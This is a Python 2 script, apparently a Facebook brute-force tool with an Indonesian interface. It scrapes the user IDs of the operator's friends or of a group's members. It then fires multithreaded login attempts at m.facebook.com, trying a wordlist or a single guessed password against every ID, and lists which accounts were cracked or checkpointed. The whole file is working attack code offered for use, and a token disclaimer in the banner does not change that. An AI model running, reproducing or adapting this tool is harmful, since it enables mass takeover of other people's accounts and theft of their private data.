from __future__ import print_function
import platform,os
def tampil(x):
	w = {'m':31,'h':32,'k':33,'b':34,'p':35,'c':36}
	for i in w:
		x=x.replace('\r%s'%i,'\033[%s;1m'%w[i])
	x+='\033[0m'
	x=x.replace('\r0','\033[0m')
	print(x)
if platform.python_version().split('.')[0] != '2':
	tampil('\rm[!] kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x'%v().split(' ')[0])
	os.sys.exit()
import cookielib,re,urllib2,urllib,threading
try:
	import mechanize
except ImportError:
	tampil('\rm[!]SepertiNya Module \rcmechanize\rm belum di install...')
	os.sys.exit()
def keluar():
	simpan()
	tampil('\rm[!]Keluar')
	os.sys.exit()
log = 0
id_bteman = []
id_bgroup = []
fid_bteman = []
fid_bgroup = []
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_cookiejar(cookielib.LWPCookieJar())
br.set_handle_redirect(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
def bacaData():
	global fid_bgroup,fid_bteman
	try:
		fid_bgroup = open(os.sys.path[0]+'/MBFbgroup.txt','r').readlines()
	except:pass
	try:
		fid_bteman = open(os.sys.path[0]+'/MBFbteman.txt','r').readlines()
	except:pass
def inputD(x,v=0):
	while 1:
		try:
			a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m'%x)
		except:
			tampil('\n\rm[!]Batal')
			keluar()
		if v:
			if a.upper() in v:
				break
			else:
				tampil('\rm[!]Masukan Opsinya Bro...')
				continue
		else:
			if len(a) == 0:
				tampil('\rm[!]Masukan dengan benar')
				continue
			else:
				break
	return a
def inputM(x,d):
	while 1:
		try:
			i = int(inputD(x))
		except:
			tampil('\rm[!]Pilihan tidak ada')
			continue
		if i in d:
			break
		else:
			tampil('\rm[!]Pilihan tidak ada')
	return i
def simpan():
	if len(id_bgroup) != 0:
		tampil('\rh[*]Menyimpan hasil dari group')
		try:
			open(os.sys.path[0]+'/MBFbgroup.txt','w').write('\n'.join(id_bgroup))
			tampil('\rh[!]Berhasil meyimpan \rcMBFbgroup.txt')
		except:
			tampil('\rm[!]Gagal meyimpan')
	if len(id_bteman) != 0:
		tampil('\rh[*]Menyimpan hasil daftar Teman...')
		try:
			open(os.sys.path[0]+'/MBFbteman.txt','w').write('\n'.join(id_bteman))
			tampil('\rh[!]Berhasil meyimpan \rcMBFbgteman.txt')
		except:
			tampil('\rm[!]Gagal meyimpan')
def buka(d):
	tampil('\rh[*]Membuka \rp'+d)
	try:
		x = br.open(d)
		br._factory.is_html = True
		x = x.read()
	except:
		tampil('\rm[!]Gagal membuka \rp'+d)
		keluar()
	if '<link rel="redirect" href="' in x:
		return buka(br.find_link().url)
	else:
		return x
def login():
	global log
	us = inputD('[?]Email/HP')
	pa = inputD('[?]Kata Sandi')
	tampil('\rh[*]Sedang Login....')
	buka('https://m.facebook.com')
	br.select_form(nr=0)
	br.form['email']=us
	br.form['pass']=pa
	br.submit()
	url = br.geturl()
	if 'save-device' in url or 'm_sess' in url:
		tampil('\rh[*]Login Berhasil')
		buka('https://mobile.facebook.com/home.php')
		nama = br.find_link(url_regex='logout.php').text
		nama = re.findall(r'\((.*a?)\)',nama)[0]
		tampil('\rh[*]Selamat datang \rk%s\n\rh[*]Semoga ini adalah hari keberuntungan mu....'%nama)
		log = 1
	elif 'checkpoint' in url:
		tampil('\rm[!]Akun kena checkpoint\n\rk[!]Coba Login dengan opera mini')
		keluar()
	else:
		tampil('\rm[!]Login Gagal')
def saring_id_teman(r):
	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
		id_bteman.append(i)
		tampil('\rc==>\rb%s\rm'%i)
def saring_id_group1(d):
	for i in re.findall(r'<h3><a href="/(.*?)fref=pb',d):
		if i.find('profile.php') == -1:
			a = i.replace('?','')
		else:
			a = i.replace('profile.php?id=','').replace('&amp;','')
		if a not in id_bgroup:
			tampil('\rk==>\rc%s'%a)
			id_bgroup.append(a)
def saring_id_group0():
	global id_group
	while 1:
		id_group = inputD('[?]Id Group')
		tampil('\rh[*]Mengecek Group....')
		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
		try:
			next = br.find_link(url_regex= '/browse/group/members/').url
			break
		except:
			tampil('\rm[!]Id yang anda masukan salah')
			continue
	tampil('\rh[*]Mengambil Id dari group \rc%s'%nama)
	saring_id_group1(a)
	return next
def idgroup():
	if log != 1:
		tampil('\rh[*]Login dulu bos...')
		login()
		if log == 0:
			keluar()
	next = saring_id_group0()
	while 1:
		saring_id_group1(buka(next))
		try:
			next = br.find_link(url_regex= '/browse/group/members/').url
		except:
			tampil('\rm[!]Hanya Bisa Mengambil \rh %d id'%len(id_bgroup))
			break
	simpan()
	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(id_bgroup)
	else:
		return menu()
def idteman():
	if log != 1:
		tampil('\rh[*]Login dulu bos...')
		login()
		if log == 0:
			keluar()
	saring_id_teman(buka('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
	try:
		next = br.find_link(url_regex= 'friends_center_main').url
	except:
		if len(id_teman) != 0:
			tampil('\rm[!]Hanya dapat mengambil \rp%d id'%len(id_bteman))
		else:
			tampil('\rm[!]Batal')
			keluar()
	while 1:
		saring_id_teman(buka(next))
		try:
			next = br.find_link(url_regex= 'friends_center_main').url
		except:
			tampil('\rm[!]Hanya dapat mengambil \rp%d id'%len(id_bteman))
			break
	simpan()
	i = inputD('[?]Langsung Crack (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(id_bteman)
	else:
		return menu()
class mt(threading.Thread):
    def __init__(self,i,p):
        threading.Thread.__init__(self)
        self.id = i
        self.a = 3
        self.p = p
    def update(self):
        return self.a,self.id
    def run(self):
        try:
             data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
        except KeyboardInterrupt:
            os.sys.exit()
        except:
            self.a = 8
            os.sys.exit()
        if 'm_sess' in data.url or 'save-device' in data.url:
            self.a = 1
        elif 'checkpoint' in data.url:
            self.a = 2
        else:
            self.a = 0
def crack(d):
	i = inputD('[?]Pake Passwordlist/Manual (p/m)',['P','M'])
	if i.upper() == 'P':
		while 1:
			dir = inputD('[?]Masukan alamat file')
			try:
				D = open(dir,'r').readlines()
			except:
				tampil('\rm[!]Gagal membuka \rk%s'%dir)
				continue
			break
		tampil('\rh[*]Memulai crack dengan \rk%d password'%len(D))
		for i in D:
			i = i.replace('\n','')
			if len(i) != 0:
				crack0(d,i,0)
		i = inputD('[?]Tidak Puas dengan Hasil,Mau coba lagi (y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(d)
		else:
			return menu()
	else:
		return crack0(d,inputD('[?]Sandi'),1)
def crack0(data,sandi,p):
	tampil('\rh[*]MengCrack \rk%d Akun \rhdengan sandi \rm[\rk%s\rm]'%(len(data),sandi))
	print('\033[32;1m[*]Cracking \033[31;1m[\033[36;1m0%\033[31;1m]\033[0m',end='')
	os.sys.stdout.flush()
	akun_jml = []
	akun_sukses = []
	akun_cekpoint = []
	akun_error = []
	akun_gagal = []
	jml0,jml1 = 0,0
	th = []
	for i in data:
		i = i.replace(' ','')
		if len(i) != 0:th.append(mt(i,sandi))
	for i in th:
		jml1 += 1
		i.daemon = True
		try:i.start()
		except KeyboardInterrupt:exit()
	while 1:
		try:
			for i in th:
				a = i.update()
				if a[0] != 3 and a[1] not in akun_jml:
					jml0 += 1
					if a[0] == 2:
						akun_cekpoint.append(a[1])
					elif a[0] == 1:
						akun_sukses.append(a[1])
					elif a[0] == 0:
						akun_gagal.append(a[1])
					elif a[0] == 8:
						akun_error.append(a[1])
					print('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m%0.2f%s\033[31;1m]\033[0m'%(float((float(jml0)/float(jml1))*100),'%'),end='')
					os.sys.stdout.flush()
					akun_jml.append(a[1])
		except KeyboardInterrupt:
			os.sys.exit()
		try:
			if threading.activeCount() == 1:break
		except KeyboardInterrupt:
			keluar()
	print('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m100%\033[31;1m]\033[0m     ')
	if len(akun_sukses) != 0:
		tampil('\rh[*]Daftar akun sukses')
		for i in akun_sukses:
			tampil('\rh==>\rk%s \rm[\rp%s\rm]'%(i,sandi))
	tampil('\rh[*]Jumlah akun berhasil\rp      %d'%len(akun_sukses))
	tampil('\rm[*]Jumlah akun gagal\rp         %d'%len(akun_gagal))
	tampil('\rk[*]Jumlah akun cekpoint\rp      %d'%len(akun_cekpoint))
	tampil('\rc[*]Jumlah akun error\rp         %d'%len(akun_error))
	if p:
		i = inputD('[?]Tidak Puas dengan Hasil,Mau coba lagi (y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(data)
		else:
			return menu()
	else:
		return 0
def lanjutT():
	global fid_bteman
	if len(fid_bteman) != 0:
		i = inputD('[?]Riset Hasil Id Teman/lanjutkan (r/l)',['R','L'])
		if i.upper() == 'L':
			return crack(fid_bteman)
		else:
			os.remove(os.sys.path[0]+'/MBFbteman.txt')
			fid_bteman = []
	return 0
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		i = inputD('[?]Riset Hasil Id Group/lanjutkan (r/l)',['R','L'])
		if i.upper() == 'L':
			return crack(fid_bgroup)
		else:
			os.remove(os.sys.path[0]+'/MBFbgroup.txt')
			fid_bgroup = []
	return 0
def menu():
	tampil('''\rh
                     88888888888888888888888888888888888888888888888888888888888P"""""""""""""""88888888888888888888888888888888888888888888888888888888
8888888888888888888888888888888888888888888888888P""°```````````````````````````'"""88888888888888888888888888888888888888888888888
888888888888888888888888888888888888888888P"`````````````````````````````````````````````"78888888888888888888888888888888888888888
8888888888888888888888888888888888888888P°``````````````````````````````````````````````````788888888888888888888888888888888888888
888888888888888888888888888888888888888``````````````````````````````````````````````````````'8888888888888888888888888888888888888
88888888888888888888888888888888888888[```````````````````````````````````````````````````````'888888888888888888888888888888888888
8888888888888888888888888888888888888P``````````````````````````````````````````````````````````88888888888888888888888888888888888
8888888888888888888888888888888888888°``````````````````````````````````````````````````````````78888888888888888888888888888888888
8888888888888888888888888888888888888`````````________`````````````````````````________,````````]8888888888888888888888888888888888
888888888888888888888888888888888888°`````.J888888888888__`````````````````.J888888888888L,`````]8888888888888888888888888888888888
88888888888888888888888888888888888P````_/°````8888_J"788888_```````````J888888"LJ888P````'"L````8888888888888888888888888888888888
88888888888888888888888888888888888[```'```````````"88L,788888,````````J8888P__8P"``````````'````8888888888888888888888888888888888
88888888888888888888888888888888888[``````````````````'88LJ788°````````78"\J8P"``````````````````7888888888888888888888888888888888
88888888888888888888888888888888888°````````````````````788L````````````.J88°````````````````````]888888888888888888888888888888888
88888888888888888888888888888888888```````````````````````'888,````````]8"```````````````````````]888888888888888888888888888888888
88888888888888888888888888888888888````````__88888888L_````]888````````'`````._J88888888L,```````]888888888888888888888888888888888
88888888888888888888888888888888888``````J8888888888888888,'888[``````````.J888888888888888L,````]888888888888888888888888888888888
88888888888888888888888888888888888````8888888888888888888°`888[```````````8888888888888888P""8888888888888888888888888888888888888
88888888888888888888888888888888888```]"""°````````````````]888[`````````````````````````````````]888888888888888888888888888888888
88888888888888888888888888888888888````````````````````````]888[`````````````````````````````````]888888888888888888888888888888888
88888888888888888888888888888888888L```````````````````````]888[`````````````````````````````````]888888888888888888888888888888888
8888888888888888888888888888888888888,`````````````````````8888[`````````````````````````````````J888888888888888888888888888888888
88888888888888888888888888888888888888,```````````````````.8888[````````````````````````````````]8888888888888888888888888888888888
88888888888888888888888888888888888L`'8,`````````````````.88888[``````````````````````````````]888888888888888888888888888888888888
8888888888888888888888888888888888888`'888__________J`.88888888`````````'"",```````````````_JP`]88888888888888888888888888888888888
8888888888888888888888888888888888888L`788]88[````````]888`]888````````````]`````'""888888"88`]888888888888888888888888888888888888
88888888888888888888888888888888888888[`"8,'88L````````7[``]88P``````````````````````.88P`]8[`J888888888888888888888888888888888888
888888888888888888888888888888888888888```8,'888,``````````'88[`````````````````````]88P`]8[`]8888888888888888888888888888888888888
8888888888888888888888888888888888888888,`'7_,88888_,```````888,````.J8[`````````._888°`.8°`.88888888888888888888888888888888888888
88888888888888888888888888888888888888888[``78,]8888888888888888888888888,```_8888888``J8°``888888888888888888888888888888888888888
888888888888888888888888888888888888888888[```8L,`'788888888888P°``"88888888888888"°.J88``.8888888888888888888888888888888888888888
8888888888888888888888888888888888888888888[```888[````'788888P``````788888888"``````J°``]88888888888888888888888888888888888888888
88888888888888888888888888888888888888888888L,``7888_``````````'""""""``````````````8°``J888888888888888888888888888888888888888888
8888888888888888888888888888888888888888888888,``'888878``````````````````````````.8```J8888888888888888888888888888888888888888888
88888888888888888888888888888888888888888888888,``'888````'""`_______,```````````J"``]888888888888888888888888888888888888888888888
888888888888888888888888888888888888888888888888[``'8L`````````888888[``````````8```J8888888888888888888888888888888888888888888888
88888888888888888888888888888888888888888888888888,`]8,````````]8888[``````````P```J88888888888888888888888888888888888888888888888
888888888888888888888888888888888888888888888888888,``°````````88888L````````````J8888888888888888888888888888888888888888888888888
8888888888888888888888888888888888888888888888888888L_````````8888P88[``````````J88888888888888888888888888888888888888888888888888
888888888888888888888888888888888888888888888888888888L```````8888888[`````````8888888888888888888888888888888888888888888888888888
8888888888888888888888888888888888888888888888888888888L``````'888888°```````J88888888888888888888888888888888888888888888888888888
888888888888888888888888888888888888888888888888888888888L`````88888[``````]8888888888888888888888888888888888888888888888888888888
88888888888888888888888888888888888888888888888888888888888_```]8888[```_J888888888888888888888888888888888888888888888888888888888
88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
88888888888888888888888888888888888````88°```78```]````````]8888888P`````8888````````'88````````]8888888888888888888888888888888888
88888888888888888888888888888888888[```8P````]P```J````.___J8888888``````]888```.8,```]8````.___J8888888888888888888888888888888888
88888888888888888888888888888888888[```8[````][``.8````'"""7888888P``._```788```'8°```88````'"""78888888888888888888888888888888888
888888888888888888888888888888888888,``'``],`````]8````````]888888°``]8[```88````````'88````````]8888888888888888888888888888888888
888888888888888888888888888888888888L`````8[`````J8````]888888888°`````````]8```]8````88````]88888888888888888888888888888888888888
8888888888888888888888888888888888888`````8[````]88````````]8888P```.__,```]8```]8[```88````````]8888888888888888888888888888888888
8888888888888888888888888888888888888_____8L____888________J8888L___J888____L___J8L___88________J8888888888888888888888888888888888
88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
888888888888888888"""""788P""""88P"""88P""``""788P"""78P"""7""""88P"""7P"""""88"""""788P"°``""888"""78""""888""``'"8888888888888888
88888888888888888[`````'88[`````8[```8[````````78[````8[```],```]8```.8[`````88`````]8`````````7L```]8````]P````````888888888888888
88888888888888888°``````]8[`````][```8````8[```]8[````][```]8,``````]88[`````88`````]P```]88````8```]8````]````"88__888888888888888
8888888888888888P```]```]8[``````[```8````8[```]8[````'°```]88,`````888[```,`"``.```][```]88````8```]8````]L``````"7888888888888888
8888888888888888°```"````8[```8,`````8````8[```]8[``]8`````]888````8888[```[````]```][```]88````8```]8````]888L,````'88888888888888
888888888888888`````````][```78`````8,```8[```]8[``]8,````]888````8888[```8````8```]L```]8P````8```]8````]```'88````88888888888888
888888888888888[```]8L````[```]8[````8L````````J8[``]8[````]888````8888[```8,``]8```]8_```````.88L```````J8L```````.888888888888888
88888888888888888888888_88888J88888LJ8888____J8888J8888L88J88888J8J88888JLJ88_J88LJL88888____888888____J888888____88888888888888888
88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888
8888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888 = Created By : ZomBie = 8888888888
88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888rk*\ZomBie
\rk###########################################################
#             \rb*MULTY BRUTEFORCE FACEBOOK*\rk                 #
# \rhBY\rp                                             PIRMANSX \rk#
# \rhGroup FB\rp  https://m.facebook.com/groups/883329811695430 \rk#
# \rhGitHub\rp                      https://github.com/BangPey87 \rk#
#       \rmDo Not Use This Tool For IllegaL Purpose          \rk#
###########################################################''')
	tampil('''\rk%s\n\rc1 \rhAmbil id dari group\n\rc2 \rhAmbil id dari daftar teman\n\rc3 \rmKELUAR\n\rk%s'''%('#'*20,'#'*20))
	i = inputM('[?]PILIH',[1,2,3])
	if i == 1:
		lanjutG()
		idgroup()
	elif i == 2:
		lanjutT()
		idteman()
	elif i == 3:
		keluar()
bacaData()
menu()
